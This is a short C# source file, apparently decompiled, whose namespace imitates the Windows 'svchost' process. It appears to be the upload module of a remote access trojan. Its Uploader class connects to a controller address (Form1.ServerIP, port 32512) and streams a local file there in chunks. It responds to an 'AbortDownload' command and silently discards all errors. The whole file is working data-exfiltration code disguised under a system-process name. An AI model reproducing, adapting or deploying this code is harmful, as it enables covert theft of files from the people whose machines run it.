using System;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace svchost;

public class Uploader
{
	public static string File;

	private TcpClient UploadClient;

	private NetworkStream UploadStream;

	private BinaryReader r;

	public Uploader()
	{
		UploadClient = new TcpClient();
	}

	public void Upload()
	{
		try
		{
			Thread.Sleep(1000);
			Application.DoEvents();
			UploadClient.Connect(Form1.ServerIP, 32512);
			UploadClient.NoDelay = true;
			UploadStream = UploadClient.GetStream();
			byte[] array = new byte[checked(UploadClient.ReceiveBufferSize + 1)];
			FileStream input = new FileStream(File, FileMode.Open, FileAccess.Read);
			r = new BinaryReader(input);
			while (r.BaseStream.Position < r.BaseStream.Length)
			{
				byte[] array2 = r.ReadBytes(10000);
				UploadStream.Write(array2, 0, array2.Length);
				if (UploadStream.DataAvailable)
				{
					int count = UploadStream.Read(array, 0, UploadClient.ReceiveBufferSize);
					string @string = Encoding.Default.GetString(array, 0, count);
					if (Strings.InStr(@string, "AbortDownload", (CompareMethod)0) != 0)
					{
						array2 = Encoding.Default.GetBytes("Aborted");
						UploadStream.Write(array2, 0, array2.Length);
						Application.DoEvents();
						Thread.Sleep(1000);
						r.Close();
						UploadClient.Close();
						UploadStream.Close();
					}
				}
			}
			Thread.Sleep(1000);
			r.Close();
			UploadClient.Close();
			UploadStream.Close();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			try
			{
				r.Close();
				UploadClient.Close();
				UploadStream.Close();
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
			ProjectData.ClearProjectError();
		}
	}
}
